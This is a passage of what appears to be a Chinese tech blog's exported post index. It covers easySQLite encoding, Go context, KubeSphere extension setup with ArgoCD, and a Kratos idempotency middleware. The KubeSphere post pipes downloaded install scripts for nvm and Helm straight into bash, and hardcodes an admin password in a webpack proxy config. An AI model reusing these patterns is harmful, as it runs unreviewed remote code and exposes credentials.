class="built_in">wmemset</span>(strUnicode, <span class="number">0</span>, len);</span><br><span class="line">    <span class="built_in">MultiByteToWideChar</span>(CP_ACP, <span class="number">0</span>, strGbk.<span class="built_in">c_str</span>(), <span class="number">-1</span>, strUnicode, len);</span><br><span class="line">    <span class="comment">//unicode转UTF-8</span></span><br><span class="line">    len = <span class="built_in">WideCharToMultiByte</span>(CP_UTF8, <span class="number">0</span>, strUnicode, <span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">char</span> * strUtf8 = <span class="keyword">new</span> <span class="type">char</span>[len];</span><br><span class="line">    <span class="built_in">WideCharToMultiByte</span>(CP_UTF8, <span class="number">0</span>, strUnicode, <span class="number">-1</span>, strUtf8, len, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="function">std::string <span class="title">strTemp</span><span class="params">(strUtf8)</span></span>;<span class="comment">//此时的strTemp是UTF-8编码</span></span><br><span class="line">    <span class="keyword">delete</span>[]strUnicode;</span><br><span class="line">    <span class="keyword">delete</span>[]strUtf8;</span><br><span class="line">    strUnicode = <span class="literal">NULL</span>;</span><br><span class="line">    strUtf8 = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> strTemp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="取字段值"><a href="#取字段值" class="headerlink" title="取字段值"></a>取字段值</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//load all records</span></span><br><span class="line">tbPerson.<span class="built_in">open</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//list loaded records</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> index = <span class="number">0</span>; index &lt; tbPerson.<span class="built_in">recordCount</span>(); index++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (Record* record = tbPerson.<span class="built_in">getRecord</span>(index)) &#123;</span><br><span class="line">        Value* value = record-&gt;<span class="built_in">getValue</span>(<span class="string">&quot;value&quot;</span>);  <span class="comment">//取value字段的值</span></span><br><span class="line">        Value* value2 = record-&gt;<span class="built_in">getKeyIdValue</span>();  <span class="comment">//取主键ID</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>easySQLite</tag>
      </tags>
  </entry>
  <entry>
    <title>一些收藏的文章</title>
    <url>//favorites/</url>
    <content><![CDATA[<p>一些看到觉得值得收藏的文章，或者自己的一些笔记。</p>
<p>来源列表:</p>
<ul>
<li>阮一峰的网络日志 weekly <a href="https://github.com/ruanyf/weekly">https://github.com/ruanyf/weekly</a></li>
<li>NK 贴贴分享群 <a href="https://applink.feishu.cn/client/chat/chatter/add_by_link?link_token=1e8u4f54-3a53-44e6-a8c1-1a954b66218c">https://applink.feishu.cn/client/chat/chatter/add_by_link?link_token=1e8u4f54-3a53-44e6-a8c1-1a954b66218c</a></li>
<li>网络文章</li>
</ul>
<span id="more"></span>

<h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><h3 id="Kubernetes"><a href="#Kubernetes" class="headerlink" title="Kubernetes"></a>Kubernetes</h3><blockquote>
<p>Kubernetes 反对者指南 <a href="https://paulbutler.org/2024/the-haters-guide-to-kubernetes/">The hater’s guide to Kubernetes</a></p>
</blockquote>
<h3 id="Backend"><a href="#Backend" class="headerlink" title="Backend"></a>Backend</h3><blockquote>
<p>Go Kratos 使用笔记 <a href="https://czyt.tech/post/go-kratos-usage-memo/">go-kratos使用备忘</a><br>What is http3 <a href="https://www.smashingmagazine.com/2021/08/http3-core-concepts-part1/">HTTP&#x2F;3 From A To Z: Core Concepts</a><br>RESTful API 设计 <a href="https://github.com/stickfigure/blog/wiki/How-to-%28and-how-not-to%29-design-REST-APIs">How to (and how not to) design REST APIs</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>Kubernetes, Go, Backend</tag>
      </tags>
  </entry>
  <entry>
    <title>Fitness function-driven development（测试驱动开发） 翻译</title>
    <url>//fitness-function-driven-development/</url>
    <content><![CDATA[<p>对 <code>TDD</code> 的一个翻译，原文地址：<a href="https://www.thoughtworks.com/insights/articles/fitness-function-driven-development">Fitness function-driven development</a></p>
<span id="more"></span>

<blockquote>
<p>原文：<a href="https://www.thoughtworks.com/insights/articles/fitness-function-driven-development">Fitness function-driven development</a></p>
</blockquote>
<p>测试驱动开发是以先编写测试样例然后编写最少可以通过测试样例的代码为基准进行开发的开发方式 TDD是一种成熟的功能开发实践，可以提高代码质量和测试覆盖率</p>
<p>Test-driven development, or TDD, involves writing tests first then developing the minimal code needed to pass the tests. TDD is an established practice for feature development that can improve code quality and test coverage. What about other, non-functional requirements such as scalability, reliability, observability, and other architectural “-ilities”? How do we ensure operability and resiliency of features when they go to production? How can we encourage teams to build in these architectural standards, just as test-driven development builds in code quality and test coverage?</p>
]]></content>
      <tags>
        <tag>TDD, 测试驱动开发</tag>
      </tags>
  </entry>
  <entry>
    <title>go 中的context</title>
    <url>//go-context/</url>
    <content><![CDATA[<p>context 是 go 语言中的一个包， 用于在多个 goroutine 之间传递数据， 以及控制 goroutine 的执行， 在这篇文章中记录了 context 的使用方法。</p>
<span id="more"></span>

<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>设想这样一个场景</p>
<blockquote>
<p>你是一个店主，经营着一家餐饮店<br>你有时会遇到这种情况：<br>有一个顾客点了一份炒饭， 收银将单子打印出来交给了服务员， 服务员传递给后厨， 后厨收到单子后开始做菜<br>顾客在等待的过程中， 突然想起了一些事情， 他想要取消这份炒饭的订单<br>但是服务员已经把单子传递给了后厨， 后厨已经开始做菜了， 我们该如何去通知后厨取消这份炒饭的订单呢？</p>
</blockquote>
<p>而在我们的项目之中， 经常可以遇到这类的问题</p>
<p>例如在后端开发中，用户的请求忽然断开，我们如果接着去处理用户请求显然是在浪费时间， 我们应该尽快的通知底层的服务， 取消这个请求的处理</p>
<h2 id="0x01-context"><a href="#0x01-context" class="headerlink" title="0x01 context"></a>0x01 context</h2><p>context 是 go 语言中的一个包， 用于在多个 goroutine 之间传递数据， 以及控制 goroutine 的执行</p>
<p>在上面这个场景中，我们就可以使用 context 来解决这个问题</p>
<p>我们可以在用户发起请求的时候， 创建一个 context 对象， 并将这个 context 对象传递给后端的服务， 服务在处理用户请求的时候， 可以通过 context 对象来实现通知取消处理</p>
<h2 id="0x02-context-的使用"><a href="#0x02-context-的使用" class="headerlink" title="0x02 context 的使用"></a>0x02 context 的使用</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;context&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">doSomething</span><span class="params">(ctx context.Context)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line">            <span class="keyword">if</span> err := ctx.Err(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                fmt.Printf(<span class="string">&quot;err: %s\n&quot;</span>, err)</span><br><span class="line">            &#125;</span><br><span class="line">            fmt.Println(<span class="string">&quot;Done at&quot;</span>, time.Now().Format(<span class="string">&quot;15:04:05&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">case</span> &lt;-time.After(<span class="number">4</span> * time.Second):</span><br><span class="line">            fmt.Println(<span class="string">&quot;Doing something at&quot;</span>, time.Now().Format(<span class="string">&quot;15:04:05&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ctx, cancelCtx := context.WithCancel(context.Background())</span><br><span class="line">    <span class="keyword">go</span> doSomething(ctx)</span><br><span class="line">    time.Sleep(<span class="number">10</span> * time.Second)</span><br><span class="line">    cancelCtx()</span><br><span class="line">    <span class="comment">// 让主线程等待一段时间，以便 doSomething() 打印 Done</span></span><br><span class="line">    time.Sleep(<span class="number">2</span> * time.Second)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Doing something at 16:05:40</span><br><span class="line">Doing something at 16:05:44</span><br><span class="line">err: context canceled</span><br><span class="line">Done at 16:05:46</span><br></pre></td></tr></table></figure>

<p>注意输出的时间间隔</p>
<p>有时我们也会遇到需要超时的场景，这时候我们可以使用 context.WithTimeout() 来创建一个 context 对象</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;context&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">doSomething</span><span class="params">(ctx context.Context)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line">            <span class="keyword">if</span> err := ctx.Err(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                fmt.Printf(<span class="string">&quot;err: %s\n&quot;</span>, err)</span><br><span class="line">            &#125;</span><br><span class="line">            fmt.Println(<span class="string">&quot;Done at&quot;</span>, time.Now().Format(<span class="string">&quot;15:04:05&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">case</span> &lt;-time.After(<span class="number">4</span> * time.Second):</span><br><span class="line">            fmt.Println(<span class="string">&quot;Doing something at&quot;</span>, time.Now().Format(<span class="string">&quot;15:04:05&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ctx, cancelCtx := context.WithTimeout(context.Background(), <span class="number">10</span>*time.Second)</span><br><span class="line">    <span class="keyword">go</span> doSomething(ctx)</span><br><span class="line">    time.Sleep(<span class="number">60</span> * time.Second)</span><br><span class="line">    cancelCtx()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Doing something at 16:12:54</span><br><span class="line">Doing something at 16:12:58</span><br><span class="line">err: context deadline exceeded</span><br><span class="line">Done at 16:13:00</span><br></pre></td></tr></table></figure>

<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>在很多需要 context 的场景中，如果我们不知道该如何使用 context，我们可以使用 context.Background() 来创建一个 context 对象， 然后将这个 context 对象传递给需要使用 context 的函数</p>
<p>如果需要函数需要 context 而我们又有接收 context，那么直接透传即可不要再创建一个 context 对象</p>
<p>对于在 context 中添加数据，我们可以使用 context.WithValue() 来创建一个 context 对象， 然后将这个 context 对象传递给需要使用 context 的函数，这样就达到了传递数据的目的，需要注意的是数据是只读的，同名下最外层的数据才有效</p>
<h2 id="0x04-参考资料"><a href="#0x04-参考资料" class="headerlink" title="0x04 参考资料"></a>0x04 参考资料</h2><p><a href="https://www.digitalocean.com/community/tutorials/how-to-use-contexts-in-go">How To Use Contexts in Go</a></p>
]]></content>
      <tags>
        <tag>golang, context</tag>
      </tags>
  </entry>
  <entry>
    <title>KubeSphere 扩展组件开发笔记</title>
    <url>//kubesphere-extended-component-development-note/</url>
    <content><![CDATA[<p>前段时间参加了云原生 Meetup 杭州站活动，正好在这次活动上了解到了 KubeSphere 正在开展扩展组件开发训练营于是报名了这个活动，记录下学习过程。</p>
<span id="more"></span>

<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>资料来源:</p>
<ul>
<li><a href="https://dev-guide.kubesphere.io/extension-dev-guide/zh/">KubeSphere 扩展组件开发指南</a></li>
</ul>
<h2 id="开发环境搭建"><a href="#开发环境搭建" class="headerlink" title="开发环境搭建"></a>开发环境搭建</h2><p>开发需要一个 ks 集群，可以使用 KubeSphere 官方提供的ks-dev环境，也可以自己搭建一个 ks 集群。</p>
<h3 id="使用ks-dev环境"><a href="#使用ks-dev环境" class="headerlink" title="使用ks-dev环境"></a>使用ks-dev环境</h3><p><a href="https://kubesphere.cloud/sign-up/?ref=REAwGESiNA">https://kubesphere.cloud/sign-up/?ref=REAwGESiNA</a> 可以在这里注册一个账号，然后在控制台创建一个 ks 集群。</p>
<p>官方每个月会赠送 10h 的免费使用时间，可以用来开发测试。</p>
<h3 id="本地安装"><a href="#本地安装" class="headerlink" title="本地安装"></a>本地安装</h3><p><code>Node</code> 使用 <code>nvm</code> 安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">nvm install 18</span><br></pre></td></tr></table></figure>

<p>安装 <code>yarn</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install --global yarn</span><br></pre></td></tr></table></figure>

<p>安装 <code>helm</code></p>
<p>这里官方提供了文件和脚本两种安装方式，因为是专门为了开发扩展组件开的环境所以为了省事直接脚本安装</p>
<p><a href="https://helm.sh/docs/intro/install/">https://helm.sh/docs/intro/install/</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash</span><br></pre></td></tr></table></figure>

<p>安装 <code>kubectl</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -LO <span class="string">&quot;https://dl.k8s.io/release/<span class="subst">$(curl -L -s https://dl.k8s.io/release/stable.txt)</span>/bin/linux/amd64/kubectl&quot;</span></span><br><span class="line">sudo <span class="built_in">chmod</span> +x kubectl </span><br><span class="line">sudo <span class="built_in">mv</span> kubectl /usr/local/bin</span><br></pre></td></tr></table></figure>

<p>安装完成以后去 <code>ks</code> 面板下载 <code>kubeconfig</code> 文件放到 <code>~/.kube/config</code> 目录下</p>
<p>安装 &#96;ksbuilder</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/kubesphere/ksbuilder/releases/download/v0.3.13/ksbuilder_0.3.13_linux_amd64.tar.gz</span><br><span class="line">tar -zxf ksbuilder_0.3.13_linux_amd64.tar.gz</span><br><span class="line">sudo <span class="built_in">mv</span> ksbuilder /usr/local/bin</span><br></pre></td></tr></table></figure>

<p>检查安装版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sonui@server:~$ ksbuilder --version</span><br><span class="line">ksbuilder version 0.3.13</span><br><span class="line">sonui@server:~$ node --version</span><br><span class="line">v18.20.2</span><br><span class="line">sonui@server:~$ yarn --version</span><br><span class="line">1.22.22</span><br><span class="line">sonui@server:~$ helm version</span><br><span class="line">version.BuildInfo&#123;Version:<span class="string">&quot;v3.14.4&quot;</span>, GitCommit:<span class="string">&quot;81c902a123462fd4052bc5e9aa9c513c4c8fc142&quot;</span>, GitTreeState:<span class="string">&quot;clean&quot;</span>, GoVersion:<span class="string">&quot;go1.21.9&quot;</span>&#125;</span><br><span class="line">sonui@server:~$ kubectl version</span><br><span class="line">Client Version: v1.30.0</span><br><span class="line">Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3</span><br><span class="line">sonui@server:~$ kubectl get node</span><br><span class="line">NAME   STATUS   ROLES                         AGE   VERSION</span><br><span class="line">ks     Ready    control-plane,master,worker   15d   v1.23.10</span><br><span class="line">sonui@server:~$ kubectl -n kubesphere-system get po</span><br><span class="line">NAME                                     READY   STATUS    RESTARTS        AGE</span><br><span class="line">ks-apiserver-754d47ffcc-fx5fz            1/1     Running   2 (6d21h ago)   15d</span><br><span class="line">ks-console-54958f4674-8s225              1/1     Running   2 (6d21h ago)   15d</span><br><span class="line">ks-controller-manager-59d55bc77b-vgnl7   1/1     Running   2 (6d21h ago)   15d</span><br></pre></td></tr></table></figure>

<h3 id="编写反向代理"><a href="#编写反向代理" class="headerlink" title="编写反向代理"></a>编写反向代理</h3><p>参考官方示例</p>
<p><a href="https://raw.githubusercontent.com/kubesphere/extension-samples/master/extensions-backend/weave-scope/weave-scope-reverse-proxy.yaml">https://raw.githubusercontent.com/kubesphere/extension-samples/master/extensions-backend/weave-scope/weave-scope-reverse-proxy.yaml</a></p>
<p>修改为 argocd</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">extensions.kubesphere.io/v1alpha1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ReverseProxy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">argocd-scope</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">directives:</span></span><br><span class="line">    <span class="attr">headerUp:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">-Authorization</span></span><br><span class="line">    <span class="attr">stripPathPrefix:</span> <span class="string">/proxy/argocd</span></span><br><span class="line">  <span class="attr">matcher:</span></span><br><span class="line">    <span class="attr">method:</span> <span class="string">&#x27;*&#x27;</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/proxy/argocd/*</span></span><br><span class="line">  <span class="attr">upstream:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">http://argocd-server.argocd.svc</span></span><br><span class="line"><span class="attr">status:</span></span><br><span class="line">  <span class="attr">state:</span> <span class="string">Available</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中 <code>upstream.url</code> 为 argocd 的服务地址</p>
<p><code>http://[service name].[namespace].svc</code></p>
<p>部署 <code>ArgoCD</code> 时需要修改下 <code>argocd-server</code> Deployment 的参数</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">args:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/usr/local/bin/argocd-server</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">--insecure</span> <span class="comment"># 关闭 http -&gt; https 重定向</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">--basehref</span> <span class="comment"># 添加 basehref 参数 使用 /proxy/argocd 作为基础路径</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/proxy/argocd</span></span><br></pre></td></tr></table></figure>

<p><code>basehref</code> 配置说明<br><img src="/./kubesphere-extended-component-development-note/image.png" alt="about basehref config" loading="lazy"></p>
<blockquote>
<p>If the Argo CD UI is available under a non-root path (e.g. &#x2F;argo-cd instead of &#x2F;) then the UI path should be configured in the API server. To configure the UI path add the –basehref flag into the argocd-server deployment command<br><a href="https://argo-cd.readthedocs.io/en/stable/operator-manual/ingress/#ui-base-path">https://argo-cd.readthedocs.io/en/stable/operator-manual/ingress/#ui-base-path</a></p>
</blockquote>
<p>插件设置下 <code>webpack.config.js</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; merge &#125; = <span class="built_in">require</span>(<span class="string">&#x27;webpack-merge&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> baseConfig = <span class="built_in">require</span>(<span class="string">&#x27;@ks-console/bootstrap/webpack/webpack.dev.conf&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> webpackDevConfig = <span class="title function_">merge</span>(baseConfig, &#123;</span><br><span class="line">  <span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;/proxy&#x27;</span>: &#123;</span><br><span class="line">        <span class="attr">target</span>: <span class="string">&#x27;http://192.168.2.150:30881&#x27;</span>, <span class="comment">// 修改为目标 ks-apiserver 的地址</span></span><br><span class="line">        <span class="attr">onProxyReq</span>: <span class="function">(<span class="params">proxyReq, req, res</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> username = <span class="string">&#x27;admin&#x27;</span>        <span class="comment">// 请求代理时的用户凭证</span></span><br><span class="line">            <span class="keyword">const</span> password = <span class="string">&#x27;P@88w0rd&#x27;</span></span><br><span class="line">            <span class="keyword">const</span> auth = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">`<span class="subst">$&#123;username&#125;</span>:<span class="subst">$&#123;password&#125;</span>`</span>).<span class="title function_">toString</span>(<span class="string">&quot;base64&quot;</span>);</span><br><span class="line">            proxyReq.<span class="title function_">setHeader</span>(<span class="string">&#x27;Authorization&#x27;</span>, <span class="string">`Basic <span class="subst">$&#123;auth&#125;</span>`</span>);</span><br><span class="line">          &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = webpackDevConfig;</span><br></pre></td></tr></table></figure>

<p>全部完成后访问控制面板可以看到弹出 <code>ArgoCD</code> 登录界面</p>
<p><img src="/./kubesphere-extended-component-development-note/image2.png" alt="ArgoCD login page in KubeSphere dashboard" loading="lazy"></p>
]]></content>
      <tags>
        <tag>KubeSphere, k8s, Go, ArgoCD</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP 幂等机制支持</title>
    <url>//provide-idempotence-mechanisms/</url>
    <content><![CDATA[<h2 id="为什么要支持幂等机制"><a href="#为什么要支持幂等机制" class="headerlink" title="为什么要支持幂等机制"></a>为什么要支持幂等机制</h2><p>HTTP 协议中的幂等性是指对同一个资源的多次请求，结果是一致的。这种特性在实际开发中非常重要，可以保证在网络不稳定的情况下，请求重试不会导致资源状态的改变。</p>
<p>对于 HTTP请求来说常见的幂等方法：<code>GET</code>、<code>HEAD</code>、<code>PUT</code>、<code>DELETE</code>、<code>OPTIONS</code>、<code>TRACE</code>，非幂等方法：<code>POST</code>、<code>PATCH</code>、<code>CONNECT</code></p>
<p>为什么要对非幂等方法进行特殊处理从而支持幂等机制呢？比如说以下场景</p>
<blockquote>
<p>李四维在使用购物平台时准备提交一个订单，但是他在一个网很差的地方，而更糟糕的是因为网络不稳定他在提交时候可能会发生请求超时导致不知道是否成功提交了订单。</p>
</blockquote>
<p>怎么办？提交订单前先发一个预创建订单来检查吗？除非没得选再考虑这个，因为这样会增加额外的请求和处理代码，也不是很好的解决方案</p>
<p>直接再请求一次呢？如果这个时候接口是非幂等的那么就会重复提交订单造成资源浪费，因此提供幂等机制在这个时候就显得非常有用。</p>
<h2 id="幂等机制的设计"><a href="#幂等机制的设计" class="headerlink" title="幂等机制的设计"></a>幂等机制的设计</h2><p>这里选择一个简单的实现方式，通过在请求头中添加一个唯一标识符来实现幂等机制，这个唯一标识符可以是一个 UUID，也可以是一个自定义的字符串，只要保证唯一性即可，而唯一性由客户端保证。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/v1/orders</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">X-Request-Id</span><span class="punctuation">: </span>e0db47c3-05c4-4205-b80a-b4a2a482fb8c</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;product_id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;quantity&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>

<p>在服务端接收到请求后，首先检查请求头中的 <code>X-Request-Id</code> 是否存在，如果存在则检查是否已经处理过，如果已经处理过则直接返回处理结果，否则继续处理请求。</p>
<p>请求头的 Key 可以自定义，这里使用 <code>X-Request-Id</code> 只是一个示例，实际开发中可以根据实际情况来定义。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">409</span> Conflict</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Request already processed&quot;</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>

<p>这样客户端就可以通过 <code>X-Request-Id</code> 来确保服务端只处理一次请求，即使请求重试也不会导致资源状态的改变。</p>
<h2 id="在-Kratos-中支持幂等机制"><a href="#在-Kratos-中支持幂等机制" class="headerlink" title="在 Kratos 中支持幂等机制"></a>在 <code>Kratos</code> 中支持幂等机制</h2><p>在 <code>Kratos</code> 中可以通过中间件来实现幂等机制，具体实现方式如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> CtxRequestKey <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    CtxReqKeyIdempotency CtxRequestKey = <span class="string">&quot;Idempotency-Key&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SetIdempotencyKeyWithCtx</span><span class="params">(ctx context.Context, key <span class="type">string</span>)</span></span> context.Context &#123;</span><br><span class="line">    <span class="keyword">return</span> context.WithValue(ctx, CtxReqKeyIdempotency, key)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 幂等处理</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IdempotencyMiddleware</span><span class="params">(handler middleware.Handler, r redis.Client)</span></span> middleware.Handler &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, req any)</span></span> (any, <span class="type">error</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> httpCtx, ok := http.RequestFromServerContext(ctx); ok &#123;</span><br><span class="line">            idempotencyKey := httpCtx.Header.Get(<span class="string">&quot;X-Request-Id&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> idempotencyKey != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">                <span class="comment">// 检查redis中是否存在该key 如果不存在则创建一个bool类型的值</span></span><br><span class="line">                <span class="keyword">if</span> b, err := r.HSetNX(ctx, <span class="string">&quot;idempotency&quot;</span>, idempotencyKey, <span class="literal">true</span>).Result(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> !b &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">nil</span>, v1.ErrorConflict(<span class="string">&quot;Request already processed&quot;</span>)</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                ctx = server.SetIdempotencyKeyWithCtx(ctx, idempotencyKey)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> handler(ctx, req)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 <code>HSetNX</code> 方法用于在 Redis 中创建一个唯一的键值对，如果键已经存在则返回 <code>false</code>，否则返回 <code>true</code></p>
<p>具体说明: <a href="https://redis.io/docs/latest/commands/hsetnx/">HSETNX</a></p>
<p>测试代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestRedisHSetNX</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    r := redis.NewClient(&amp;redis.Options&#123;</span><br><span class="line">        Addr: <span class="string">&quot;localhost:6379&quot;</span>,</span><br><span class="line">        DB:   <span class="number">0</span>,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    ctx := context.Background()</span><br><span class="line">    b, err := r.HSetNX(ctx, <span class="string">&quot;key&quot;</span>, <span class="string">&quot;field&quot;</span>, <span class="literal">true</span>).Result()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        t.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    t.Log(b)</span><br><span class="line"></span><br><span class="line">    c, err := r.HSetNX(ctx, <span class="string">&quot;key&quot;</span>, <span class="string">&quot;field&quot;</span>, <span class="literal">true</span>).Result()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        t.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    t.Log(c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
